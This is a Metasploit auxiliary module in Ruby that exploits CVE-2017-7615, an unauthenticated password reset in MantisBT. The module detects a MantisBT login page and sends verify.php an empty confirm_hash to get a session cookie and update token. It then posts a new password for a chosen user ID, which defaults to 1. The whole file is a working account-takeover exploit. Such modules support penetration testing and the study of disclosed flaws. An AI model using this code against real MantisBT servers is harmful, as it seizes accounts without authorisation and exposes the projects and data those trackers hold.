##
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'       => "MantisBT password reset",
      'Description'  => %q{
        MantisBT before 1.3.10, 2.2.4, and 2.3.1 are vulnerable to unauthenticated password reset.
      },
      'License'    => MSF_LICENSE,
      'Author'     =>
        [
          'John (hyp3rlinx) Page',  # initial discovery
          'Julien (jvoisin) Voisin' # metasploit module
        ],
      'References'   =>
        [
          ['CVE', '2017-7615'],
          ['URL', 'https://mantisbt.org/bugs/view.php?id=22690']
        ],
      'Platform'     => ['win', 'linux'],
      'Privileged'   => false,
      'DisclosureDate' => "Apr 16, 2017"))

      register_options(
        [
          OptString.new('USERID', [ true, 'User id to reset', 1]),
          OptString.new('PASSWORD', [ false, 'The new password to set (blank for random)', '']),
          OptString.new('TARGETURI', [ true, 'Relative URI of MantisBT installation', '/'])
        ]
			)
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, '/login_page.php'),
        'method'=>'GET'
      })

      if res and res.body and res.body.include? 'Powered by <a href="http://www.mantisbt.org" title="bug tracking software">MantisBT'
        vprint_status("MantisBT detected")
        return Exploit::CheckCode::Detected
      else
        vprint_status("Not a MantisBT Instance!")
        return Exploit::CheckCode::Safe
      end

    rescue Rex::ConnectionRefused
      print_error("Connection refused by server.")
      return Exploit::CheckCode::Safe
    end
  end

  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/verify.php'),
      'method' => 'GET',
      'vars_get' => {
        'id' => datastore['USERID'],
        'confirm_hash' => ''
      }
    })

    if !res or !res.body
      fail_with(Failure::UnexpectedReply, "Error in server resonse. Ensure the server IP is correct.")
    end

    cookie = res.get_cookies

    if cookie == '' || !(res.body.include? 'Your account information has been verified.')
      fail_with(Failure::NoAccess, "Authentication failed")
    end


    if datastore['PASSWORD'].blank?
      password = Rex::Text.rand_text_alpha(8)
    else
      password = datastore['PASSWORD']
    end

    res.body =~ /<input type="hidden" name="account_update_token" value="([a-zA-Z0-9_-]+)"/
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/account_update.php'),
      'method' => 'POST',
      'vars_post' => {
          'verify_user_id' => datastore['USERID'],
          'account_update_token' => $1,
          'realname' => 'jvoisin',
          'password' => password,
          'password_confirm' => password
        },
      'cookie' => cookie
    })

    if res and res.body and res.body.include? 'Password successfully updated'
      print_good("Password successfully changed to '#{password}'.")
    else
      fail_with(Failure::UnexpectedReply, 'Something went wrong, the password was not changed')
    end
  end
end
